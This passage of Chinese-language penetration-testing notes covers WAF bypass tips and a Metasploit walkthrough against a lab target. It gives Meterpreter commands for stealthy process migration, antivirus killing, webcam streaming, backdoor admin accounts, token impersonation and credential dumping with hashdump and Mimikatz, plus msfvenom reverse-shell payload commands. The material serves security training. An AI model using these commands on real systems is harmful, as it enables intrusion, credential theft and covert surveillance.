   使用生僻函数代替常见函数，例如在报错注入中使用 `polygo()` 函数替换 `updatexml()` 函数。

8. **寻找网站源站IP**

   对于具有云WAF防护的网站而言，只要找到网站的IP地址，通过IP访问网站就可以绕过云WAF检测。寻找网站IP的常见方法：

   - 寻找网站的历史解析记录
   - 多个不同区域Ping网站，查看IP解析的结果
   - 找网站的二级域名、NS、MX记录等对应的IP
   - 订阅网站邮件，查看邮件发送方的IP

9. **注入参数到Cookies中**

   若程序使用*$_REQUEST*获取参数，且WAF只检测GET/POST而没有检测Cookie，则可以将注入语句放入Cookie中进行绕过。





## Metasploit技术

Metasploit是一款开源的安全漏洞检测工具，几乎所有的操作系统都支持Metasploit。

Metasploit框架（Metasploit Framework,MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。

Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、Web、CLI）。推荐使用控制台接口，通过控制台接口，你可以访可和使用所有Metasploit的插件，例如 Payload、利用模块、Post模块等。Metasploit还有第三方程序的接口，例如Nmap、 SQLMap等，可以直接在控制台接口里使用，要访问该界面，需要在命令行下输入：msfconsole，MSF的启动界面如下：

![image-20210317152557141](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210317152557141.png)

> 关于kali的更新系统
>
> - apt-get update
>
>   更新软件包的索引源，同步索引信息
>
> - apt-get upgrade
>
>   升级系统上安装的所有软件包，升级失败会保持更新前的状态
>
> - apt-get dist-upgrade
>
>   升级整个Linux系统，



### Metasploit基础

MSF框架由多个模块组成

**1、Auxiliaries（辅助模块）**

该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。

**2、Exploit（漏洞利用模块）**

漏洞利用是指由渗透试者利用一个系统、应用或者服务中的安全漏同进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。

**3、Payload（攻击载荷模块）**

攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等

**4、Post（后期渗适模块）**

该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等

**5、Encoders（编码工具模块）**

该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来



### 渗透攻击步骤

使用MSF渗透测试时，可以综合使用以上模块，对目标系统进行侦察并发动攻击，大致的步骤如下

- 扫描目标机系统，寻找可用漏洞
- 选择并配置一个漏洞利用模块
- 选择并配置一个攻击载荷模块
- 选择一个编码技术，用来绕过杀毒软件的查杀
- 渗透攻击



### 主机扫描

#### 辅助模块——端口扫描

利用search命令搜索可以端口模块

![image-20210317162841940](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210317162841940.png)

```
search portscan
```

这里可以查看扫描器列表，其中包含了各种类型的扫面类型

![image-20210317163213605](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210317163213605.png)

这里使用TCP模块，`auxiliary/scanner/portscan/tcp`

输入 `use` 命令即可使用该模块，使用 `show options` 命令查看需要设置的参数：

![image-20210317180230407](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210317180230407.png)



查看Required列中，被标记为yes的参数必须填写参数。其中RHOSTS设置待扫描的IP地址、PORTS设置扫描端口范围、THREADS设置扫描线程，我们使用set命令设置相应的参数，也可以使用unset命令取消某个参数值的设置！

我们通过再次  `show options` 查看刚刚设置的值，设置好了就可以 `run` 运行了！

![image-20210317201214313](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210317201214313.png)

**知识点：**

> 其实还有两条可选命令-setg命令和unsetg命令。二者用于Metasploit中设置或取消全局性的参数值，从而避免重复输入相同的值。



#### 辅助模块——服务扫描

通过search命令搜索scanner可以发现大量的扫描模块



| 模块                                  | 功能              |
| ------------------------------------- | ----------------- |
| auxiliary/scanner/portscan/tcp        | 端口扫描          |
| auxiliary/scanner/smb/smb_version     | SMB系统版本扫描   |
| auxiliary/scanner/smb/smb_enumusers   | SMB枚举           |
| auxiliary/scanner/smb/smb_login       | SMB弱口令扫描     |
| auxiliary/scanner/smb/psexec_command  | SMB登录且执行命令 |
| auxiliary/scanner/ssh/ssh_login       | SSH登录测试       |
| auxiliary/scanner/mssql/mssql_ping    | MSSQL主机信息扫描 |
| auxiliary/admin/mssql/mssql_enum      | MSSQL枚举         |
| auxiliary/admin/mssql/mssql_exec      | MSSQL命令执行     |
| auxiliary/admin/mssql/mssql_sql       | MSSQL查询         |
| auxiliary/scanner/mssql/mssql_login   | MSSQL弱口令扫描   |
| auxiliary/admin/mysql/mysql_enum      | MySQL枚举         |
| auxiliary/admin/mysql/mysql_sql       | MySQL语句执行     |
| auxiliary/scanner/mysql/mysql_login   | MySQL弱口令扫描   |
| auxiliary/scanner/smtp/smtp_version   | SMTP版本扫描      |
| auxiliary/scanner/smtp/smtp_enum      | SMTP枚举          |
| auxiliary/scanner/snmp/community      | SNMP扫描设备      |
| auxiliary/scanner/telnet/telnet_login | LELNET登录        |
| auxiliary/scanner/vnc/vnc_none_auth   | VNC空口令扫描     |



#### 使用Nmap扫描

在这Metasploit同样可以使用Nmap扫描，具体用法之前讲过，这里我们只要在msf命令提示符下输入`nmap`

![image-20210318082609905](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318082609905.png)

例如我们获得目标主机的操作系统（参数意思是不使用ping的方式，假定目标主机是活动的，可以穿透防火墙，避免被防火墙发现）

```
nmap -O -Pn/p0 192.168.163.136
```

可以看到目标操作系统是Linux 2.6版本

![image-20210318083350714](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318083350714.png)



### 漏洞利用

每个操作系统都有bug，需要及时更新安全补丁，但是打补丁会造成机器重启或者死机。安全意识薄弱的个人用户或企业可能会忽略了更新系统补丁，那么未打补丁的机器，就是一个黑客快乐的“天堂”

我们选用Metasploitable2（专门用来进行LInux渗透的靶机），这是一个Ubuntu发行版



#### 1、开始信息收集

首先进行目标主机的端口扫描，收集服务版本的信息

![image-20210318084425283](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318084425283.png)



#### 2、利用漏洞模块

这里我们举例samba应用，这是一款局域网内的共享文件系统基于SMB协议的免费软件

我们输入：`msf> search samba` 寻找samba的漏洞利用模块

![image-20210318084833101](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318084833101.png)

这个排序是根据各个漏洞利用的难易度进行排序的，这里选用`usermap_script`进行渗透

![image-20210318085114690](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318085114690.png)

我们可以用：info 命令查询这个模块的信息，这里我们就直接use这个模块`show options` 查看所需的信息

```
show options
```

![image-20210318085321345](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318085321345.png)



接着我们使用 `show payloads` 查看该漏洞模块下的攻击载荷，这里我们攻击Linux主机，需要选择LInux下的攻击载荷

```
show payloads
set payloads cmd/unix/reverse
```

这里选择基础的 `cmd/unix/reverse` 反向攻击载荷模块

![image-20210318085921553](images/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2.assets/image-20210318085921553.png)

![image-20210318090131225](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318090131225.png)

再设置目标IP，设置端口号，设置发动攻击主机的IP

![image-20210318090555854](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318090555854.png)

![image-20210318090637782](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318090637782.png)



设置完参数后直接输入攻击命令，`exploit` 或者 `run` 

攻击成功后，我们会和目标主机建立一个shell连接！

![image-20210318091744865](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318091744865.png)



### 后渗透攻击工作&准备

对成功渗透进的主机，我们可以使用**Metasploit**提供的**Meterpreter**工具，使后续的渗透入侵变得更容易。后期渗透模块有200多个，Meterpreter有以下优势

- 使用加密通信协议，而且可以同时与几个信道通信。
- 在被攻击进程内工作，不需要创建新的进程。
- 易于在多进程之间迁移。
- 平台通用，适用于 Windows、Linux、BSD系统，并支持Intel x86和Intel x64平台。

本节将介绍如何利用**Meterpreter**做好后渗透的准备工作及收集系统各类信息和数据



#### 进程迁移

刚刚获得的**Meterpreter shell**是十分脆弱的和易受攻击的，如果目标发现直接下线这个服务就会导致好不容易拿到是shell消失，所以，我们拿到shell后第一步就是**移动shell**，将它和目标中一个**稳定的进程绑定在一起**，而不需要对磁盘进行任何写入操作，使得渗透更难被检测到！

**首先 `ps` 查看目标主机有哪些进程**

![image-20210318125104109](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318125104109.png)

![image-20210318153005750](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318153005750.png)

再输入 `getpid` 命令查看 Meterpreter Shell的进程号

![image-20210318152713337](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318152713337.png)

总结一下，进程PID：1052；Name：spoolsv.exe。输入migarte 2828命令，吧shell移动到2828的svchost.exe进程里（这里需要选择一个稳定的程序进行转移）

```
migrate 2828
```

迁移之后会自动杀除原先PID，如果没有就kill它

```
kill 1052
```

自动迁移到其他进程

```
run post/windows/manage/migrate
```

![image-20210318154343906](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318154343906.png)



#### 系统命令

##### 查看目标的系统信息

```
sysinfo
```

![image-20210318155701108](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155701108.png)



##### 查看目标机是否在虚拟机上

```
run post/windows/gather/checkvm
```

![image-20210318155742231](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155742231.png)



##### 查看运行时间

```
idletime
```

![image-20210318155848538](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155848538.png)



##### 查看目标机的路由

```
route
```

![image-20210318155944041](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155944041.png)



##### 隐藏后台

想在 MSF 终端中执行其他任务，可以使用 `background` 命令将 Meterpreter 终端隐藏在后台

```
background
```

Metasploit 的 `session`命令可以查看已经成功获取的会话，如果想继续与某会话进行交互，可以使用 `session -i`命令，最后用 `session -k`命令杀死

```
sessions
sessions -i
sessions -k
```

![image-20210318160512439](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318160512439.png)



##### 查看目标机器已经渗透成功的用户名

```
getuid
```



##### 关闭杀毒软件

```
run post/windows/manage/killav
```

![image-20210318160830939](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318160830939.png)



##### 开启远程桌面

```
run post/windows/manage/enable_rdp
```

可以看到我们已经开启的远程桌面（3389）

![image-20210318161000359](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318161000359.png)



##### 查看本地的网络情况

```
run post/multi/manage/autoroute
```

![image-20210318161251734](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318161251734.png)



##### 添加路由

background命令先隐藏后台，`route add` 添加路由，添加成功后输入 `route print` 查看

```
route add
route print
```

可以看到我们已将一条地址为192.168.172.0 路由添加进攻陷主机的的路由表中，然后就可以**借用被攻陷的主机对其他网络进行攻击**

![image-20210318161751467](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318161751467.png)



##### 查看有多少用户登录了目标机

```
run post/windows/gather/enum_logged_on_users
```

![image-20210318162404847](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318162404847.png)



##### 查看目标机的应用程序

```
run post/windows/gather/enum_applications
```

![image-20210318162728835](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318162728835.png)



##### 抓取自动登录的用户名和密码

```
run windows/gather/credentials/windows_autologin
```

![image-20210318163103995](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318163103995.png)



##### 抓取屏幕截图

需要用到扩展插件：Espia，使用前先要加载该插件再截图桌面

```
load espia
screengrab 或者 screenshot
```

系统会告诉保存截图的地址

![image-20210318173649899](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318173649899.png)



##### 查看摄像头

1. **查看目标有没有摄像头**

   ```
   webcam_list
   ```

   ![image-20210318174033652](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174033652.png)

2. **调用摄像头拍照**

   ```
   webcam_snap
   ```

   ![image-20210318174045354](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174045354.png)

3. **开启摄像头的直播模式**

   ```
   webcam_stream
   ```

   这里系统会给一个地址，打开这个地址就可以看直播了

   ![image-20210318174433593](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174433593.png)

   ![image-20210318174649477](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174649477.png)



##### 进入目标机Shell

直接 `shell` 命令进入目标机，`exit` 退出

```
shell
exit
```

**chcp命令解决中文乱码**

这种方式只能用来临时解决部分中文乱码问题，可以正常显示英文，但不能显示中文

```
chcp 65001
```



#### 文件系统命令

| 命令                         | 作用                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| pwd/getwd                    | 当前目录                                                     |
| getlwd                       | 获取本地目录                                                 |
| ls                           | 当前目录下的文件                                             |
| cd                           | 切换目录                                                     |
| search -f*.txt-d c: \:       | 搜索C盘下所有“.txt”为扩展名的文件，`-f` 用于指定搜索文件模式，`-d` 指定那个目录下搜索 |
| download c:\test.txt /root   | 下载目标主机C盘下的test.txt，到攻击机的root目录下            |
| upload /root/test.txt  c: \: | 上传攻击机的root目录下test.txt，到目标主机C盘下              |



### 后渗透攻击：权限提升

为了可以控制更多的设备或者拿取更多的资料，我们需要将自己的访问级别从Guset提升到User，再到Administrator，最后到System级别。

渗透的最终目的就是拿到服务器的最高权限，提升权限的方式分为以下两类。

- 纵向提权：低权限角色获得高权限角色的权限

  这种也叫做权限提升

- 横向提权：获取同级別角色的权限

  通过已经攻破的系统A获取了系统B的权限，那么这种提权就属于横向提权。



#### 查看自己的权限

```
whoami/groups
```

![image-20210318182357807](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318182357807.png)



#### 利用WMIC本地溢出漏洞（提权）

实战MS16-032

假设此处我们通过一系列的渗透测试得到了目标机器的 Meterpreter Shell，首先输入 `getuid` 命令査看已经获得的权限，可以看到现在的权限很低，是test权限。尝试輸入 `geosystem` 命令提权

```
getsystem
```

如果失败了可以查看系统已打的补丁，shell到CMD下用该命令，或者查看C:\windows\里留下的补丁号 ".log" 查看大概打了哪些补丁

```
shell
systeminfo
```

![image-20210318193055501](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318193055501.png)

我们再用 `WMIC`  命令列出已安装的补丁

```
wmic qfe get
```

![image-20210318193356992](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318193356992.png)



关于漏洞信息的分析可以参考下面两个网站

> - 安全焦点，https://www.securityfocus.com/
> - Exploit-DB，http://www.exploit-db.com



**知识点：**WMIC是 Windows Management Instrumentation Command line的简称，它是一款**命令行管理工具**，不仅可以管理本地计算机，还可以管理同一域内的所有远程计算机（需要必要的权限），而被管理的远程计算机不必事先安装WMIC

wmic.exe位于Windows目录下，是一个命令行程序，WMIC可以以两种模式

- **交互模式：**毎当一个命令执行完毕后，系统都会返回到MIC提示符下如"Root\cli"，交互模式通常在需要执行多个WMIC指令时使用，有时还会对一些敏感的操作要求确认，例如删除操作，这样能最大限度地防止用户操作出现失误。
- **非交互模式：**非交互模式是指将WMIC指令直接作为WMIC的参数放在WMIC后面，当指令执行完毕后再返回到普通的命令提示符下，而不是进入WMIC上下文环境中。WMIC的非交互模式主要用于批处理或者其他一些脚本文件中。

> 需要注意的是，在Windows XP下，低权限用户是不能使用WMIC命令的，但是在 Windows7系统和 Windows8系统下，低权限用户可以使用WMIC，且不用更改任何设置。



WMIC在信息收集和后渗透测试阶段非常实用，可以调取查看目标机的进程服务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装补丁、启动项、已安装的软件、操作系统的相关信息和时区等。
接下来准备提权，同样需要先把 Meterpreter会话转为后台执行，然后搜索MS16-032

![image-20210318195340707](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318195340707.png)

这里使用这个，再指定 session 为 1 进行提权操作（这个就是设置我们刚刚进去的地方）

![image-20210318195504056](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318195504056.png)

这样可以进行提权操作了！现在我们就是SYSTEM级权限了！

![image-20210318200218863](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318200218863.png)



#### 部分系统对应补丁号

| **Win2003**                                                  | **Win2008**                                                  | **Win2012**                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| KB2360937\|MS10-084 KB2478960\|MS11-014 KB2507938\|MS11-056 KB2566454\|MS11-062 KB2646524\|MS12-003 KB2645640\|MS12-009 KB2641653\|MS12-018 KB944653\|MS07-067 KB952004\|MS09-012 PR KB971657\|MS09-041 KB2620712\|MS11-097 KB2393802\|MS11-011 KB942831\|MS08-005 KB2503665\|MS11-046 KB2592799\|MS11-080 KB956572\|MS09-012烤肉 KB2621440\|MS12-020 KB977165\|MS10-015Ms Viru KB3139914\|MS16-032 KB3124280\|MS16-016 KB3134228\|MS16-014 KB3079904\|MS15-097 KB3077657\|MS15-077 KB3045171\|MS15-051 KB3000061\|MS14-058 KB2829361\|MS13-046 KB2850851\|MS13-053EPATHOBJ 0day 限32位 KB2707511\|MS12-042 sysret -pid KB2124261\|KB2271195 MS10-065 IIS7 KB970483\|MS09-020IIS6 | KB3139914\|MS16-032 KB3124280\|MS16-016 KB3134228\|MS16-014 KB3079904\|MS15-097 KB3077657\|MS15-077 KB3045171\|MS15-051 KB3000061\|MS14-058 KB2829361\|MS13-046 KB2850851\|MS13-053EPATHOBJ 0day 限32位 KB2707511\|MS12-042 sysret -pid KB2124261\|KB2271195 MS10-065 IIS7 KB970483\|MS09-020IIS6 | KB3139914\|MS16-032 KB3124280\|MS16-016 KB3134228\|MS16-014 KB3079904\|MS15-097 KB3077657\|MS15-077 KB3045171\|MS15-051 KB3000061\|MS14-058 KB2829361\|MS13-046 KB2850851\|MS13-053EPATHOBJ 0day 限32位 KB2707511\|MS12-042 sysret -pid KB2124261\|KB2271195 MS10-065 IIS7 KB970483\|MS09-020IIS |



#### 创建windows用户

使用meterpreter命令`shell`获取shell

使用CMD指令创建用户并进行用户提权

`net user 用户名 密码 /add`
`net localgroup administrators 用户名 /add`
`exit`退出CMD

使用meterpreter命令`run getgui -e`开放3389端口

开启远程桌面



#### 令牌窃取（提权）

##### 令牌窃取原理

令牌（Token）就是系统的临时密钥，相当于账户名和密码，用来判断这次请求的所属用户。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。除非系统重新启动令牌才会丢失。令牌最大的特点就是随机性，不可预测。

令牌的类型：

- 访问令牌( Access Token）：表示访问控制操作主题的系统对象
- 密保令牌（Security token）：又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备，例如U盾
- 会话令牌（Session Token）：是交互会话中唯一的身份标识符。

在假冒令牌攻击中需要使用**Kerberos协议**。所以在使用假冒令牌前，我们要知道Kerberos协议！



##### Kerberos协议

Kerberos协议用于为客户提供认证服务

![image-20210318203117141](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318203117141.png)

**服务过程**

1. 客户端向认证服务器(AS)发送请求，要求得到服务器的证书
2. AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。该证书包括服务器 ticket（包括服务器密钥加密的客户机身份和份会话密钥）和一个临时加密密钥(又称为会话密钥， session key)。当然，认证服务器也会给服务器发送一份该证书，用来使服务器认证登录客户端的身份
3. 客户端将ticket传送到服务器上，服务器确认该客户端的话，便允许它登录服务器。
4. 客户端登录成功后，攻击者就可以通过入侵服务器获取客户端的令牌。



##### 假冒令牌的实战

假设我们已经获得了目标机的Meterpreter Shell，输入 `getuid`  查看我们以获得的权限

列出可用的令牌

```
use incognito		/加载这个模块
list_tokens -u		/列出可用令牌
```

![image-20210319131843599](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319131843599.png)

可以看到这里有两种类型的令牌

- **Delegation Tokens：**授权令牌，支持交互式登录（例如可以通过远程桌面登录访问）
- **Impersonation Tokens：**模拟令牌，它是非交互的会话。令牌的数量其实取决于Meterpreter Shell的访问级别



这里我们就测试`WIN-J4K72UEU38S\86198` 这个令牌，其中**WIN-J4K72UEU38S**表示主机名，**86198**表示登录的用户名，下面利用**incognito**调用**impersonate_token**来假冒**86198**用户

```
impersonate_token WIN-J4K72UEU38S\\86198
```

**知识点：**在输入 **HOSTNAME\USERNAME** 时需要输入两个反斜杠 `\\`



#### Hash攻击（提权）

##### 使用Hashdump抓取密码

Hashdump Meterpreter脚本可以**从目标机器中提取Hash值**，破解Hash值即可获得登录密码。计算机中的每个账号（如果是域服务器，则为域内的每个账号）的用户名和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，要想访问就必须有“系统级”账号。所以要使用该命令就必须进行权限的提升。

在Meterpreter Shell提示符下输入 `hashdump` 命令，将导出目标机sam数据库中的Hash

```
hashdump
```

![image-20210319155526365](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319155526365.png)

在非SYSTEM权限下远行 `hashdump` 命令会失败，而且在 Windows7、Windows Server2008下有时候会出现进程移植不成功等问题；而另一个模块 **`smart hashdumpe`** 的功能更为强大，可以导出域所有用户的Hash，其工作流程如下：

- 检查Meterpreter会话的权限和目标机操作系统类型
- 检查目标机是否为域控制服务器
- 首先尝试从注册表中读取Hash，不行的话再尝试注入LSASS进程

这里要注意如果目标机的系统是 Windows7，而目开启了UAC，获取Hash就会失败，这时需要先使用绕过UAC的后渗透攻击模块

```
run windows/gather/smart_hashdump
```

![image-20210319160110938](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319160110938.png)



##### 使用Quarks PwDump抓取密码

PwDump是一款Win32环境下的系统授权信息导出工具，目前没有任何一款工具可以导出如此全面的信息、支持这么多的OS版本，而且相当稳定。

它目前可以导出：

- Local accounts NT/LM hashes+history本机NT/LM哈希+历史登录记录
- Domain accounts NT/LM hashes+history域中的NT/LM哈希+历史登录记录
- Cached domain password缓存中的域管理密码
- Bitlocker recovery information (recovery passwords & key packages)使用Bitlocker的恢复功能后遗留的信息(恢复密码&关键包)

PwDump支持的操作系统为Windows XP/Windows 2003/Windows Vista/Windows 7/Windows 2008/Windows 8

在Windows的密码系统中，密码以加密的方式保存在/windows/ system32/config/下的sam文件里，而账号在登录后会将密码的密文和明文保存在系统的内存中。正常情况下系统启动后，sam文件是不能被读取的，但是PwDump就能读取sam

直接运行Quarks PwDump.exe，默认显示帮助信息，参数含义如下：

| 参数  | 含义                                 |
| ----- | ------------------------------------ |
| -dhl  | 导出本地哈希值                       |
| -dhdc | 导出内存中的域控哈希值               |
| -dhd  | 导出域控哈希值，必须指定NTDS文件     |
| -db   | 导出 Bitlocker信息，必须指定NTDS文件 |
| -nt   | 导出NTDS文件                         |
| -hist | 导出历史信息，可选项                 |
| -t    | 可选导出类型，默认导出John类型       |
| -o    | 导出文件到本地                       |

![image-20210319162415279](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319162415279.png)

输入命令导出密码

```
QuarksPwDump_v0.3b.exe -o xxx.txt
```



##### 使用Windows Credentials Editor抓取密码

**Windows Credentials Editor（WCE）**是一款强大的Windows平台内网渗透工具，渗透工具，它能列举登录会话，并且可以添加、改变和删除相关凭据（例如LM/NT Hash)。这些功能在内网渗透中能够被利用，例如，在Windows平台上执行绕过Hash操作或者从内存中获取NT/LM Hash(也可以从交互式登录、服务、远程桌面连接中获取）以用于进一步的攻击，而且体积也非常小，是内网渗透时的必备工具。不过必须在管理员权限下使用，注意免杀。

首先输入upload命令将wce.exe上传到目标主机C盘中，然后在目标机Shell下输入`wce -w`命令，便会成功提取系统明文管理员的密码

```
wce -w
```

![image-20210319163901047](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319163901047.png)



默认使用**`-l`**命令读取数据（这种方法是在内存中读取已经登录的信息，而不是读取sam数据库中的信息）默认的读取方式是，**先用安全的方式读取，若读取失败再用不安全的方式**，所以很有可能对系统造成破坏。我们经常使用**`-f`**参数强制使用安全的方式读取，-g用来计算密码的

| 参数 | 作用                                                         |
| ---- | ------------------------------------------------------------ |
| `-l` | 在内存中读取已经登录的信息，不是全部的账号信息，这是先用安全的方式读取，若读取失败再用不安全的方式，因此很有可能对系统造成破坏。（默认） |
| `-f` | 强制使用安全的方式读取                                       |
| `-g` | 计算密码，就是制定一个系统明文会使用的加密方法来计算密文     |
| `-c` | 用于执行cmd                                                  |
| `-v` | 用于查询看详细信息，比如uid                                  |
| `-w` | 用于查看已登陆的明文密码                                     |

![image-20210319183429605](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319183429605.png)

![image-20210319183521983](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319183521983.png)



##### 使用Mimikatz抓取密码（新工具kiwi）

Mimikatz是一款后渗适测试工具，可以轻松抓取系统密码，此外还包括能够通过获取的Kerberos登录凭据，绕过支持RestrictedAdmin模式下Windows8或Windows Server2012的远程终端(RDP)等功能。需要注意该工具在Windows2000与Windows XP系统下无法使用！

**Mimikatz必须在管理员权限下使用**，此时假设我们通过一系列前期渗透，已经成功获得目标机的Meterpreter Shell，当前权限为Administrator,输入 `getsystem` 命令获取了系统权限

```
getsystem
```

![image-20210319184139331](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319184139331.png)

获取系统SYSTEM权限后，首先查看目标机器的架构。虽然Mimikatz同时支持32位和64位的Windows架构，但如果服务器是64位操作系统，直接使用Mimikatz后，Meterpreter会默认加载个32位版本的Mimikatz到内存，使得很多功能无效。而且在64位操作系统下必须先查看系统进程列表，然后在加载Mimikatz之前将进程迁移到个64位程序的进程中，才能查看系统密码明文，在32位操作系统下就没有这个限制。这里输入 `sysinfo` 命令

```
sysinfo
```

![image-20210319185405075](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319185405075.png)

这里我们用kiwi这个模块，这个是新的

```
load kiwi
help kiwi
```

![image-20210319185915850](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319185915850.png)

直接命令查看所有，其他参数可以根据提示执行

```
creds_all
```

| 命令                  | 功能                                         |
| --------------------- | -------------------------------------------- |
| creds_all             | 列举所有凭据                                 |
| creds_kerberos        | 列举所有kerberos凭据                         |
| creds_msv             | 列举所有msv凭据                              |
| creds_ssp             | 列举所有ssp凭据                              |
| creds_tspkg           | 列举所有tspkg凭据                            |
| creds_wdigest         | 列举所有wdigest凭据                          |
| dcsync                | 通过DCSync检索用户帐户信息                   |
| dcsync_ntlm           | 通过DCSync检索用户帐户NTLM散列、SID和RID     |
| kerberos_ticket_list  | 列举kerberos票据                             |
| kerberos_ticket_purge | 清除kerberos票据                             |
| kerberos_ticket_use   | 使用kerberos票据                             |
| kiwi_cmd              | 执行mimikatz的命令，后面接mimikatz.exe的命令 |
| lsa_dump_sam          | dump出lsa的SAM                               |
| lsa_dump_secrets      | dump出lsa的密文                              |
| password_change       | 修改密码                                     |
| wifi_list             | 列出当前用户的wifi配置文件                   |
| wifi_list_shared      | 列出共享wifi配置文件/编码                    |





### 后渗透攻击：移植漏洞利用代码模块

Metasploit的框架才是灵魂，它允许使用者开发自己的漏洞模块，从而进行测试，这些模块可以是用各种语言编写的，例如Perl、 Python等，Metasploit支持各种不同语言编写的模块移植到其框架中。通过这种机制可以将各种现存的模块软件移植到这个框架中。

`metasploit-framework/modules/exploits`目录下就是模块的存放地方，我们也可以存入自己的模块，输入命令重新加载全部文件

```
reload_all
```

在移植到框架后需要先生成一个DLL文件，需要根据系统位数生成对应的DLL

- 64位

  ```
  msfvenom -p windows/x64/meterpreter/reverse_tcp/Ihost=192.168.31.247 lport=4444 -f dll-o ~/eternal11.dll
  ```

- 32位

  ```
  msfvenom -p windows/meterpreter/reverse_tcp/Ihost=172.19.31.247 -f dll-o ~/eternal11.dll
  ```



### 后门

#### 操作系统后门













































































































































## Powershell击指南













































